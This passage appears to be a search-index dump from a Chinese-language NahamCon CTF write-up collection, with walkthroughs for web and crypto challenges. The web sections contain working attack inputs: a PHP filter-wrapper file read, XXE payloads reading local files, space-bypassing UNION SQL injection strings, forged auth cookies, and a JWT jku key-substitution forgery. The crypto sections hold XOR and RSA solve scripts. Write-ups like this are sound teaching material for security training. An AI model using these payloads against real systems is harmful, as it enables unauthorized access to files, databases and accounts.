\"\\x61\\x3A\\x6C\\x61\\x73\\x74\" , \"\" , \"\\x66\\x6C\\x61\\x67\" , \"\\x53\\x6B\\x4E\\x55\\x52\\x6E\\x74\\x7A\\x63\\x47\\x39\\x76\\x62\\x32\\x39\\x76\\x61\\x33\\x6C\\x66\\x5A\\x32\\x68\\x76\\x63\\x33\\x52\\x7A\\x58\\x32\\x6C\\x75\\x58\\x33\\x4E\\x30\\x62\\x33\\x4A\\x68\\x5A\\x32\\x56\\x39\" , \"\\x73\\x65\\x74\\x49\\x74\\x65\\x6D\" , \"\\x6C\\x6F\\x63\\x61\\x6C\\x53\\x74\\x6F\\x72\\x61\\x67\\x65\" , \"\\x64\\x61\\x74\\x61\" , \"\\x66\\x75\\x6E\\x63\\x74\\x69\\x6F\\x6E\" , \"\\x64\\x65\\x66\\x61\\x75\\x6C\\x74\\x73\" , \"\\x65\\x78\\x74\\x65\\x6E\\x64\" , \"\\x6F\\x76\\x65\\x72\\x66\\x6C\\x6F\\x77\\x2D\\x79\" , \"\\x63\\x73\\x73\" , \"\\x76\\x69\\x73\\x69\\x62\\x6C\\x65\" , \"\\x66\\x69\\x72\\x73\\x74\" , \"\\x6E\\x65\\x78\\x74\\x53\\x65\\x6C\\x65\\x63\\x74\\x6F\\x72\" , \"\\x66\\x69\\x6E\\x64\" , \"\\x62\\x6F\\x64\\x79\" , \"\\x68\\x72\\x65\\x66\" , \"\\x61\\x74\\x74\\x72\" , \"\\x20\" , \"\\x63\\x6F\\x6E\\x74\\x65\\x6E\\x74\\x53\\x65\\x6C\\x65\\x63\\x74\\x6F\\x72\" , \"\\x74\\x72\\x69\\x6D\" , \"\\x73\\x72\\x63\" , \"\\x69\\x6D\\x67\" , \"\\x66\\x69\\x6C\\x74\\x65\\x72\" , \"\\x6C\\x6F\\x61\\x64\\x69\\x6E\\x67\\x48\\x74\\x6D\\x6C\" , \"\\x6C\\x65\\x6E\\x67\\x74\\x68\" , \"\\x2E\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x69\\x6E\\x6E\\x65\\x72\" , \"\\x3C\\x64\\x69\\x76\\x20\\x63\\x6C\\x61\\x73\\x73\\x3D\\x22\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x69\\x6E\\x6E\\x65\\x72\\x22\\x20\\x2F\\x3E\" , \"\\x77\\x72\\x61\\x70\\x41\\x6C\\x6C\" , \"\\x63\\x6F\\x6E\\x74\\x65\\x6E\\x74\\x73\" , \"\\x70\\x61\\x67\\x69\\x6E\\x67\\x53\\x65\\x6C\\x65\\x63\\x74\\x6F\\x72\" , \"\\x68\\x69\\x64\\x65\" , \"\\x63\\x6C\\x6F\\x73\\x65\\x73\\x74\" , \"\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x6E\\x65\\x78\\x74\\x2D\\x70\\x61\\x72\\x65\\x6E\\x74\" , \"\\x61\\x64\\x64\\x43\\x6C\\x61\\x73\\x73\" , \"\\x2E\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x69\\x6E\\x6E\\x65\\x72\\x2C\\x2E\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x61\\x64\\x64\\x65\\x64\" , \"\\x6E\\x6F\\x74\" , \"\\x70\\x61\\x72\\x65\\x6E\\x74\" , \"\\x3C\\x64\\x69\\x76\\x20\\x63\\x6C\\x61\\x73\\x73\\x3D\\x22\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x6E\\x65\\x78\\x74\\x2D\\x70\\x61\\x72\\x65\\x6E\\x74\\x22\\x20\\x2F\\x3E\" , \"\\x77\\x72\\x61\\x70\" , \"\\x75\\x6E\\x77\\x72\\x61\\x70\" , \"\\x63\\x68\\x69\\x6C\\x64\\x72\\x65\\x6E\" , \"\\x2E\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x61\\x64\\x64\\x65\\x64\" , \"\\x72\\x65\\x6D\\x6F\\x76\\x65\\x44\\x61\\x74\\x61\" , \"\\x2E\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\" , \"\\x75\\x6E\\x62\\x69\\x6E\\x64\" , \"\\x64\\x69\\x76\\x2E\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x69\\x6E\\x6E\\x65\\x72\" , \"\\x62\\x6F\\x72\\x64\\x65\\x72\\x54\\x6F\\x70\\x57\\x69\\x64\\x74\\x68\" , \"\\x70\\x61\\x64\\x64\\x69\\x6E\\x67\\x54\\x6F\\x70\" , \"\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x54\\x6F\\x70\" , \"\\x74\\x6F\\x70\" , \"\\x6F\\x66\\x66\\x73\\x65\\x74\" , \"\\x68\\x65\\x69\\x67\\x68\\x74\" , \"\\x63\\x65\\x69\\x6C\" , \"\\x77\\x61\\x69\\x74\\x69\\x6E\\x67\" , \"\\x70\\x61\\x64\\x64\\x69\\x6E\\x67\" , \"\\x6F\\x75\\x74\\x65\\x72\\x48\\x65\\x69\\x67\\x68\\x74\" , \"\\x69\\x6E\\x66\\x6F\" , \"\\x6A\\x53\\x63\\x72\\x6F\\x6C\\x6C\\x3A\" , \"\\x66\\x72\\x6F\\x6D\\x20\\x62\\x6F\\x74\\x74\\x6F\\x6D\\x2E\\x20\\x4C\\x6F\\x61\\x64\\x69\\x6E\\x67\\x20\\x6E\\x65\\x78\\x74\\x20\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x2E\\x2E\\x2E\" , \"\\x6E\\x65\\x78\\x74\\x48\\x72\\x65\\x66\" , \"\\x77\\x61\\x72\\x6E\" , \"\\x6A\\x53\\x63\\x72\\x6F\\x6C\\x6C\\x3A\\x20\\x6E\\x65\\x78\\x74\\x53\\x65\\x6C\\x65\\x63\\x74\\x6F\\x72\\x20\\x6E\\x6F\\x74\\x20\\x66\\x6F\\x75\\x6E\\x64\\x20\\x2D\\x20\\x64\\x65\\x73\\x74\\x72\\x6F\\x79\\x69\\x6E\\x67\" , \"\\x61\\x75\\x74\\x6F\\x54\\x72\\x69\\x67\\x67\\x65\\x72\" , \"\\x61\\x75\\x74\\x6F\\x54\\x72\\x69\\x67\\x67\\x65\\x72\\x55\\x6E\\x74\\x69\\x6C\" , \"\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2E\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\" , \"\\x62\\x69\\x6E\\x64\" , \"\\x63\\x6C\\x69\\x63\\x6B\\x2E\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\" , \"\\x3C\\x64\\x69\\x76\\x20\\x63\\x6C\\x61\\x73\\x73\\x3D\\x22\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x6C\\x6F\\x61\\x64\\x69\\x6E\\x67\\x22\\x3E\" , \"\\x3C\\x2F\\x64\\x69\\x76\\x3E\" , \"\\x68\\x74\\x6D\\x6C\" , \"\\x6C\\x61\\x73\\x74\" , \"\\x3C\\x64\\x69\\x76\\x20\\x63\\x6C\\x61\\x73\\x73\\x3D\\x22\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x61\\x64\\x64\\x65\\x64\\x22\\x20\\x2F\\x3E\" , \"\\x61\\x70\\x70\\x65\\x6E\\x64\" , \"\\x65\\x72\\x72\\x6F\\x72\" , \"\\x72\\x65\\x6D\\x6F\\x76\\x65\" , \"\\x2E\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x6E\\x65\\x78\\x74\\x2D\\x70\\x61\\x72\\x65\\x6E\\x74\" , \"\\x63\\x61\\x6C\\x6C\\x62\\x61\\x63\\x6B\" , \"\\x63\\x61\\x6C\\x6C\" , \"\\x64\\x69\\x72\" , \"\\x6C\\x6F\\x61\\x64\" , \"\\x64\\x69\\x76\\x2E\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x61\\x64\\x64\\x65\\x64\" , \"\\x61\\x6E\\x69\\x6D\\x61\\x74\\x65\" , \"\\x64\\x65\\x62\\x75\\x67\" , \"\\x6F\\x62\\x6A\\x65\\x63\\x74\" , \"\\x61\\x70\\x70\\x6C\\x79\" , \"\\x6C\\x6F\\x67\" , \"\\x73\\x6C\\x69\\x63\\x65\" , \"\\x70\\x72\\x6F\\x74\\x6F\\x74\\x79\\x70\\x65\" , \"\\x66\\x6E\" , \"\\x69\\x6E\\x69\\x74\\x69\\x61\\x6C\\x69\\x7A\\x65\\x64\" , \"\\x65\\x61\\x63\\x68\" ]; for ( var i = 0 ; i < _0xbcec . length ; i ++ ){ console . log ( _0xbcec [ i ]); } flag\u5c31\u5728\u91cc\u9762\u3002","title":"Localghost"},{"location":"wp/NahamConCTF/#phphonebook","text":"\u663e\u793a\uff1a Sorry! You are in /index.php/?file= The phonebook is located at phphonebook.php \u660e\u663e\u7684\u6587\u4ef6\u5305\u542b\uff0c\u7528\u4f2a\u534f\u8bae\u8bfb\u53d6phponebook.php\u3002 ?file=php://filter/read=convert.base64-encode/resource=phphonebook.php phponebook.php\uff1a <!DOCTYPE html> <html lang=\"en\"> <head> <meta charset=\"utf-8\"> <title>Phphonebook</title> <link href=\"main.css\" rel=\"stylesheet\"> </head> <body class=\"bg\"> <h1 id=\"header\"> Welcome to the Phphonebook </h1> <div id=\"im_container\"> <img src=\"book.jpg\" width=\"50%\" height=\"30%\"/> <p class=\"desc\"> This phphonebook was made to look up all sorts of numbers! Have fun... </p> </div> <br> <br> <div> <form method=\"POST\" action=\"#\"> <label id=\"form_label\">Enter number: </label> <input type=\"text\" name=\"number\"> <input type=\"submit\" value=\"Submit\"> </form> </div> <div id=\"php_container\"> <?php extract ( $_POST ); if ( isset ( $emergency )){ echo ( file_get_contents ( \"/flag.txt\" )); } ?> </div> </br> </br> </br> <div style=\"position:fixed; bottom:1%; left:1%;\"> <br><br><br><br> <b> NOT CHALLENGE RELATED:</b><br>THANK YOU to INTIGRITI for supporting NahamCon and NahamCon CTF! <p> <img width=600px src=\"https://d24wuq6o951i2g.cloudfront.net/img/events/id/457/457748121/assets/f7da0d718eb77c83f5cb6221a06a2f45.inti.png\"> </p> </div> </body> </html> \u53d8\u91cf\u8986\u76d6\uff0cpost\u4f20\u9012**emergency**\u4efb\u610f\u503c\u5c31\u884c\u3002","title":"Phphonebook"},{"location":"wp/NahamConCTF/#official-business","text":"\u7ed9\u4e86\u4e2a\u767b\u5f55\u6846\uff0c\u6e90\u7801\u5728robots.txt\u91cc\u9762\uff1a #!/usr/bin/env python3 from flask import ( Flask , render_template , request , abort , redirect , make_response , g , jsonify , ) import binascii import hashlib import json app = Flask ( __name__ ) app . secret_key = open ( \"secret_key\" , \"r\" ) . read () . strip () FLAG = open ( \"flag.txt\" , \"r\" ) . read () . strip () def do_login ( user , password , admin ): cookie = { \"user\" : user , \"password\" : password , \"admin\" : admin } cookie [ \"digest\" ] = hashlib . sha512 ( app . secret_key + bytes ( json . dumps ( cookie , sort_keys = True ), \"ascii\" ) ) . hexdigest () response = make_response ( redirect ( \"/\" )) response . set_cookie ( \"auth\" , binascii . hexlify ( json . dumps ( cookie ) . encode ( \"utf8\" ))) return response @app . route ( \"/login\" , methods = [ \"POST\" ]) def login (): user = request . form . get ( \"user\" , \"\" ) password = request . form . get ( \"password\" , \"\" ) if ( user != \"hacker\" or hashlib . sha512 ( bytes ( password , \"ascii\" )) . digest () != b \"hackshackshackshackshackshackshackshackshackshackshackshackshack\" ): return abort ( 403 ) return do_login ( user , password , True ) def load_cookie (): cookie = {} auth = request . cookies . get ( \"auth\" ) if auth : try : cookie = json . loads ( binascii . unhexlify ( auth ) . decode ( \"utf8\" )) digest = cookie . pop ( \"digest\" ) if ( digest != hashlib . sha512 ( app . secret_key + bytes ( json . dumps ( cookie , sort_keys = True ), \"ascii\" ) ) . hexdigest () ): return False , {} except : pass return True , cookie @app . route ( \"/logout\" , methods = [ \"GET\" ]) def logout (): response = make_response ( redirect ( \"/\" )) response . set_cookie ( \"auth\" , \"\" , expires = 0 ) return response @app . route ( \"/\" ) def index (): ok , cookie = load_cookie () if not ok : return abort ( 403 ) return render_template ( \"index.html\" , user = cookie . get ( \"user\" , None ), admin = cookie . get ( \"admin\" , None ), flag = FLAG , ) @app . route ( \"/robots.txt\" ) def source (): return \" \" + open(__file__).read() + \" \" if __name__ == \"__main__\" : app . run ( debug = True , host = \"0.0.0.0\" , port = 1337 ) flask\u6a21\u677f\uff0c\u4e3b\u8981\u662f\u6709\u767b\u5f55\u3001\u52a0\u8f7dcookie\u3001index\u7b49\u6a21\u5757\uff0c\u770b\u4e00\u4e0blogin\u65b9\u6cd5\uff0c\u4e3b\u8981\u4ee3\u7801\uff1a if ( user != \"hacker\" or hashlib . sha512 ( bytes ( password , \"ascii\" )) . digest () != b \"hackshackshackshackshackshackshackshackshackshackshackshackshack\" ) sha512\u7684\u7b7e\u540d\u7b97\u6cd5\uff0c\u60f3\u76f4\u63a5\u7206\u7834password\u6765\u5b9e\u73b0\u767b\u5f55\u4e0d\u592a\u53ef\u80fd\u3002\u5728index\u90e8\u5206\u6211\u4eec\u80fd\u53d1\u73b0\uff0c\u8c03\u7528\u4e86**load_cookie**\u5bf9**cookie**\u8fdb\u884c\u4e86\u6821\u9a8c\uff0c\u770b\u4e00\u4e0b**load_cookie**\u90e8\u5206\uff0c\u7531\u4e8e\u5b58\u5728\u672a\u77e5\u5bc6\u94a5\uff1a app . secret_key + bytes ( json . dumps ( cookie , sort_keys = True ), \"ascii\" ) bypass\u4e0d\u592a\u53ef\u80fd\u3002\u5728**do_login**\u90e8\u5206\u53d1\u73b0\u54cd\u5e94\u5305\u662f\u83b7\u53d6cookie\u7684auth\u503c\uff0c\u7531\u4e8e**do_login**\u90e8\u5206\u5e76\u672a\u7528\u5bc6\u94a5\u8fdb\u884c\u9a8c\u8bc1\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u4f2a\u9020cookie\uff0c\u6765\u7ed5\u8fc7do_login\u90e8\u5206\uff0c\u5b9e\u73b0admin\u7684\u767b\u5f55\u72b6\u6001\uff0c\u6784\u9020\u811a\u672c\uff1a from flask import ( Flask , render_template , request , abort , redirect , make_response , g , jsonify , ) import binascii import hashlib import json cookie = { \"user\" : 'hacker' , \"password\" : 'sw0r3d' , \"admin\" : True } print ( binascii . hexlify ( json . dumps ( cookie ) . encode ( \"utf8\" ))) \u5728index\u9875\u9762\u6293\u5305\u5728\u8bf7\u6c42\u5934\u589e\u52a0cookie\u7684auth\u503c\u5373\u53ef\u7ed5\u8fc7\u83b7\u5f97flag\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91ccindex\u9875\u9762\u83b7\u53d6user\u548cpass\u90fd\u662f\u4ececookie\u83b7\u53d6\u7684\uff0c\u8ddf\u767b\u5f55\u6846\u7684\u503c\u6ca1\u6709\u5173\u7cfb\uff0c\u4e5f\u5c31\u662f\u4f2a\u9020cookie\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u7528\u6237\u767b\u5f55\u3002","title":"Official Business"},{"location":"wp/NahamConCTF/#extraterrestrial","text":"\u7ed9\u4e86\u4e2a\u8868\u683c\u8f93\u5165\u6846\uff0c\u5c1d\u8bd5xxs\u548csql\u65e0\u679c\uff0c\u6293\u5305\u5728Accept\u53d1\u73b0\u53ef\u4ee5\u662fxml\u5c5e\u6027\uff0c\u5c1d\u8bd5xml\u6ce8\u5165\uff0c\u7528\u6700\u7b80\u5355\u7684xml\u6a21\u677f\u5373\u53ef\uff1a <?xml version=\"1.0\" encoding=\"utf-8\"?> <!DOCTYPE ANY [ <!ENTITY xxe SYSTEM \"file:///etc/hosts\"> ]> <sw0r3d> &xxe; </sw0r3d> \u63d0\u793a**The flag is at the *start of the solar system.***\uff0c\u5c1d\u8bd5flag\u3001flag.txt\u7b49\u5173\u952e\u5b57\uff0c\u53d1\u73b0\u662fflag.txt\uff1a <?xml version=\"1.0\" encoding=\"utf-8\"?> <!DOCTYPE ANY [ <!ENTITY xxe SYSTEM \"file:///flag.txt\"> ]> <sw0r3d> &xxe; </sw0r3d> \u5c31\u80fd\u83b7\u5f97flag","title":"Extraterrestrial"},{"location":"wp/NahamConCTF/#rejected-sequel","text":"\u7ed9\u4e86\u4e00\u4e2a\u67e5\u8be2\u6846\uff0c\u5728\u6e90\u7801\u53d1\u73b0\u4e86\u5982\u4e0b\u8bed\u53e5\uff1a <!-- if ( isset($_GET[\"debug\"])){ echo($sql_query); } --> \u5e94\u8be5\u662fsql\u6ce8\u5165\uff0c\u800c\u4e14\u7528debug\u53c2\u6570\u53ef\u4ee5\u770b\u5230\u6267\u884c\u7684sql\u8bed\u53e5\uff0c\u901a\u8fc7\u8fd9\u4e2a\u8bed\u53e5\u6211\u4eec\u80fd\u5224\u65ad\u54ea\u4e9b\u654f\u611f\u53c2\u6570\u88ab\u8fc7\u6ee4\u3002\u7b80\u5355\u6d4b\u8bd5\u4e00\u4e0b\u53d1\u73b0\u53ea\u6709\u7a7a\u683c\u88ab\u8fc7\u6ee4\u4e86\uff0c\u53ef\u4ee5\u7528 /**/ \u6216\u8005\u62ec\u53f7\u4ee3\u66ff\uff0c\u7136\u540e\u5c31\u662f\u6700\u7b80\u5355\u7684union\u8054\u5408\u6ce8\u5165\u4e86\u3002\u8fd9\u91cc\u6709\u4e2a\u5c0f\u5751\u70b9\uff0c\u4e00\u822c\u6765\u8bf4\u8bed\u53e5\u90fd\u662f\u901a\u8fc7\u5355\u5f15\u53f7\u95ed\u5408\uff0c\u800c\u8fd9\u91cc\u662f\u4f7f\u7528\u53cc\u5f15\u53f7\u3002\u95ed\u5408\u7684\u65f6\u5019\u6ce8\u610f\u4e00\u4e0b\u5373\u53ef - 1 \"/**/order/**/by/**/1# //\u67e5\u8be2\u5217\u6570\uff0c\u53ea\u6709\u4e00\u5217 -1\" /**/ union /**/ select /**/ database () # // \u67e5\u5e93 res : rejected_sequel - 1 \"/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='rejected_sequel'# //\u8868\u540d res:flag,movies -1\" /**/ union /**/ select /**/ group_concat ( column_name ) /**/ from /**/ information_schema . columns /**/ where /**/ table_name = 'flag' # // \u5b57\u6bb5\u540d res : flag - 1 \" /**/ union /**/ select /**/ flag /**/ from /**/ flag # res : flag { at_least_this_sequel_got_published }","title":"Rejected Sequel"},{"location":"wp/NahamConCTF/#flag-jokes","text":"\u9898\u76ee\u63d0\u793a\u9700\u8981\u7528admin\u767b\u5f55\uff0c\u76f4\u63a5\u7528admin\u767b\u5f55\u53d1\u73b0\u6ca1\u6709\u6743\u9650\uff0c\u5148\u5c1d\u8bd5\u5176\u4ed6\u7528\u6237\u540d\uff0c\u6293\u4e2a\u5305\u53d1\u73b0cookie \u628atoken\u5728jwt.io\u4e0a\u89e3\u7801\u5f97\u5230\uff1a \u80fd\u770b\u51fa\u52a0\u5bc6\u7b97\u6cd5\u662frs256\uff0c\u8fd8\u6709\u5947\u602a\u7684jku\u548ckid\u3002\u6839\u636ejku\u7684\u503c\u6211\u4eec\u53ef\u4ee5\u8bbf\u95ee\u5bf9\u5e94\u7f51\u7ad9\u7684jwks.json\u503c \u4f7f\u7528\u7684\u662fRSA\u7b7e\u540d\u7b97\u6cd5\u6765\u8fdb\u884c\u9a8c\u8bc1\uff0c\u7b80\u5355\u6765\u8bf4\u9a8c\u8bc1\u8fc7\u7a0b\u5927\u6982\u901a\u8fc7jku\u7684\u503c\u6765\u5305\u542bjwks.json\uff0c\u901a\u8fc7e\u548cn\u6c42\u51fa\u516c\u94a5\u548c\u79c1\u94a5\uff0c\u7136\u540e\u751f\u6210\u5bf9\u5e94\u7528\u6237\u540d\u7684token\u503c\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f2a\u9020json\u7684\u503c\u6765\u7ed5\u8fc7admin\u7684\u767b\u5f55\u9650\u5236\u3002\u56e0\u4e3ajku\u7684\u503c\u53ef\u63a7\uff0c\u4e5f\u5c31\u662f\u7b7e\u540d\u8fc7\u7a0b\u53ef\u63a7\u3002\u7531\u4e8ekid\u503c\u662f\u56fa\u5b9a\u7684\uff0c\u901a\u8fc7kid\u7684\u503c\u5728\u7ebf\u751f\u6210\u79c1\u94a5\u548c\u516c\u94a5\uff0c\u7136\u540e\u5305\u542bvps\u7684jwks.json\u6765\u8fdb\u884c\u9a8c\u8bc1\u3002\uff08\u5177\u4f53\u8fc7\u7a0b\u53c2\u8003\u4e0b\u9762\u94fe\u63a5\uff09 \u5c06\u751f\u6210\u7684jwk\u8f6c\u5316\u4e3apem\u683c\u5f0f( https://8gwifi.org/jwkconvertfunctions.jsp ) \u7136\u540e\u5728vps\u4e0a\u5199\u5165json\uff0c\u4ee5\u4fbfjku\u901a\u8fc7\u9a8c\u8bc1 { \"keys\" : [ { \"kty\" : \"RSA\" , \"e\" : \"AQAB\" , \"use\" : \"sig\" , \"kid\" : \"sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc\" , \"alg\" : \"RS256\" , \"n\" : \"hGDLA-Uhfq7iAWx-TGOi2HlFbPDu7LHqKMI9L0BU2gDQrx-Vbrt6m-6A1rydDEdZtqdhGV_78Y0jA4qXUjQ5rkjVjWLkoDPyT26Fw6TCKCZxmZEPc55d6PBe-if99TD7VaVtnJ8utYaFoHL-UdAXlaI1EOvFmXrBo4SH86PLW6BIniFY7iY0GPFiCC9CBzjJmw9JIkfZNRv-ATn6NhVbgbtXPcUdtlCGS92ho6MRLjLO4O1RzvsBpf2Whq6I2h0NI6y8MVqPSGvnsabVhZWOtauFgu7vm2wr7LM9RYmH4UTtV_mZT5yTPGL2SeWcaldf2QXArKTnzune8n9UMLKkew\" } ] } \u4fee\u6539jku\u548cusername\u7684\u503c\u5373\u53ef\u767b\u5f55admin\u3002 \u5177\u4f53\u53c2\u8003\uff1a https://jwt.io/ https://mkjwk.org/ https://tools.ietf.org/html/rfc7638 https://8gwifi.org/jwkconvertfunctions.jsp https://security.stackexchange.com/questions/167894/rsa-jwk-format-and-parameters-meaning","title":"Flag Jokes"},{"location":"wp/NahamConCTF/#crypto","text":"","title":"Crypto"},{"location":"wp/NahamConCTF/#docxor","text":"\u7ed9\u4e86\u4e2a\u672a\u77e5\u9644\u4ef6\uff0c\u63d0\u793a\u5bc6\u94a5\u662f4\u4e2a\u5b57\u7b26\u3002\u6839\u636e\u9898\u76ee\u540d\u5b57\u5f88\u5bb9\u6613\u5c31\u80fd\u77e5\u9053\u8003\u70b9\uff0c\u4e00\u5f00\u59cb\u4ee5\u4e3a\u662fdoc\u7684\u6587\u4ef6\u683c\u5f0f\uff0c\u540e\u9762\u8bd5\u4e86\u8bd5\u53d1\u73b0\u4e0d\u884c\uff0c\u540e\u9762\u5c1d\u8bd5docx\u7684\u6807\u51c6\u683c\u5f0f\u7684\u6587\u4ef6\u5934\u6765\u63a8\u65ad\u51fakey\u3002\u53d1\u73b0\u53ef\u4ee5\uff0c\u6ce8\u610f\u662f\u6807\u51c6\u6587\u4ef6\u5934\uff0c\u4e0d\u7136\u5f88\u5bb9\u6613\u51fa\u9519\u3002\u3002\u3002\u89e3\u5bc6\u5373\u53ef from itertools import * f = open ( 'homework' , 'rb' ) . read () key = [ 90 , 65 , 153 , 187 ] flag = '' for i , j in zip ( f , cycle ( key )): flag += chr ( ord ( i ) ^ j ) with open ( 'flag.docx' , 'wb' ) as f : f . write ( flag )","title":"Docxor"},{"location":"wp/NahamConCTF/#homecooked","text":"\u76f4\u63a5\u7ed9\u4e86\u4e00\u4e2a\u89e3\u5bc6\u7684py\u6587\u4ef6\uff0c\u4e0d\u8fc7\u8fd0\u884c\u53d1\u73b0\u540e\u9762\u51e0\u4f4d\u4e00\u76f4\u7206\u7834\u4e0d\u51fa\u6765\u3002\u3002\u89c2\u5bdf\u4e00\u4e0b\u4ee3\u7801\uff1a import base64 num = 0 count = 0 cipher_b64 = b \"MTAwLDExMSwxMDAsOTYsMTEyLDIxLDIwOSwxNjYsMjE2LDE0MCwzMzAsMzE4LDMyMSw3MDIyMSw3MDQxNCw3MDU0NCw3MTQxNCw3MTgxMCw3MjIxMSw3MjgyNyw3MzAwMCw3MzMxOSw3MzcyMiw3NDA4OCw3NDY0Myw3NTU0MiwxMDAyOTAzLDEwMDgwOTQsMTAyMjA4OSwxMDI4MTA0LDEwMzUzMzcsMTA0MzQ0OCwxMDU1NTg3LDEwNjI1NDEsMTA2NTcxNSwxMDc0NzQ5LDEwODI4NDQsMTA4NTY5NiwxMDkyOTY2LDEwOTQwMDA=\" def a ( num ): if ( num > 1 ): for i in range ( 2 , num ): if ( num % i ) == 0 : return False break return True else : return False def b ( num ): my_str = str ( num ) rev_str = reversed ( my_str ) if list ( my_str ) == list ( rev_str ): return True else : return False cipher = base64 . b64decode ( cipher_b64 ) . decode () . split ( \",\" ) while ( count < len ( cipher )): if ( a ( num )): if ( b ( num )): print ( chr ( int ( cipher [ count ]) ^ num ), end = '' , flush = True ) count += 1 if ( count == 13 ): num = 50000 if ( count == 26 ): num = 500000 else : pass num += 1 print () \u660e\u663e\u80fd\u53d1\u73b0a\u51fd\u6570\u662f\u7528\u6765\u5224\u65ad\u4e00\u4e2a\u6570\u662f\u5426\u4e3a\u7d20\u6570\uff0c\u4e0d\u8fc7\u89c2\u5bdf\u4f20\u9012\u7684num\u503c\uff0c\u80fd\u53d1\u73b0\u5f53count\u4e3a26\u65f6\uff0c\u4f20\u9012\u7684num\u503c\u53d8\u6210\u4e86500000\uff0c\u800ca\u51fd\u6570\u7528\u7684\u662f2-num\u7684\u5e8f\u5217\uff0c\u8fd9\u662f\u5bfc\u81f4\u65f6\u95f4\u8fc7\u957f\u7684\u6839\u672c\u539f\u56e0\u3002\u4ed4\u7ec6\u601d\u8003\u53d1\u73b0\u5224\u65ad\u4e00\u4e2a\u6570\u4e3a\u7d20\u6570\u53ea\u9700\u8981\u75282-\u5e73\u65b9\u6839\u8fd9\u4e2a\u5e8f\u5217\u5373\u53ef\u3002\u5f88\u7b80\u5355\u7684\u4e00\u4e2a\u539f\u7406\uff1a $$ \u5047\u8bbe a=bc, b<c, b\u4e00\u5b9a\u5c0f\u4e8ea\u7684\u5e73\u65b9\u6839 $$ \u6240\u4ee5\u66f4\u6362\u5e8f\u5217\u5373\u53ef\u3002\u3002\u5f53\u7136\u5982\u679cnum\u7684\u503c\u5f88\u5927\uff0c\u4e5f\u53ef\u4ee5\u7528\u5e93\u7684\u5185\u7f6e\u51fd\u6570\u5224\u65ad\uff08\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\uff09\u3002","title":"Homecooked"},{"location":"wp/NahamConCTF/#twinning","text":"\u7b80\u5355RSA\u5c31\u4e0d\u591a\u8bf4\u4e86\u6ca1\u4ec0\u4e48\u610f\u4e49 import gmpy2 from Crypto.Util.number import * e = 65537 n = 158889932099 p = 398611 q = 398609 c = 19549668696 d = gmpy2 . invert ( e ,( p - 1 ) * ( q - 1 )) print pow ( c , d , n )","title":"Twinning"},{"location":"wp/NahamConCTF/#ooo-la-la","text":"\u8fd8\u662f\u7b80\u5355RSA\u3002\u3002\u3002\u3002 import gmpy2 from Crypto.Util.number import * N = 3349683240683303752040100187123245076775802838668125325785318315004398778586538866210198083573169673444543518654385038484177110828274648967185831623610409867689938609495858551308025785883804091 e = 65537 c = 87760575554266991015431110922576261532159376718765701749513766666239189012106797683148334771446801021047078003121816710825033894805743112580942399985961509685534309879621205633997976721084983 p = 1830213987675567884451892843232991595746198390911664175679946063194531096037459873211879206428213 q = 1830213987675567884451892843232991595746198390911664175679946063194531096037459873211879206428207 d = gmpy2 . invert ( e ,( p - 1 ) * ( q - 1 )) print long_to_bytes ( pow ( c , d , N ))","title":"Ooo-la-la"},{"location":"wp/NahamConCTF/#unvreakable-vase","text":"\u7ed9\u4e86\u4e00\u4e32\u5bc6\u6587\uff1a zmxhz3tkb2vzx3roaxnfzxzlbl9jb3vudf9hc19jcnlwdg9vb30= \u80fd\u53d1\u73b0\u662fbase64\uff0c\u4e0d\u8fc7\u5927\u5c0f\u5199\u88ab\u6e05\u9664\u4e86\uff0c\u5199\u811a\u672c\u7206\u7834\u5373\u53ef\uff0c\u6bcf\u4e2a\u5b57\u6bcd\u7684\u72b6\u6001\u53ea\u67090\u548c1\uff0c\u603b\u5171\u53ea\u670930\u591a\u4e2a\u5b57\u6bcd\uff0c\u5b57\u7b26\u7a7a\u95f4\u5e94\u8be5\u662f2^30?\uff0c\u8fd8\u7b97\u53ef\u4ee5\u63a5\u53d7\u4f46\u662f\u8fd8\u662f\u592a\u5927\uff0c\u6839\u636ebase64\u52a0\u89e3\u5bc6\u539f\u7406\uff0c\u5bc6\u6587\u4e00\u822c\u662f\u9694\u6bb5\u52a0\u5bc6\uff0c\u5177\u4f53\u53ef\u53c2\u8003base64\u52a0\u5bc6\u539f\u7406\u3002\u6839\u636e\u8fd9\u4e2a\u65b9\u6cd5\u53ea\u9700\u8981\u5224\u65ad\u6bcf\u6bb5\u662f\u5426\u4e3a\u6b63\u786e\u5b57\u7b26\u4e32\u5373\u53ef\u3002\u6211\u5199\u7684\u811a\u672c\u592a\u83dc\uff0c\u53c2\u8003\u56fd\u5916\u5927\u4f6c\u7684\u5373\u53ef\uff1a from base64 import b64decode as decode from itertools import product data = 'zmxhz3tkb2vzx3roaxnfzxzlbl9jb3vudf9hc19jcnlwdg9vb30=' CHARSET = 'abcdefghijklmnopqrstuvwxyz_ {} ' def case_variations ( string ): possibilities = [] for char in string : possibilities . append ([ char . lower (), char . upper ()]) return [ 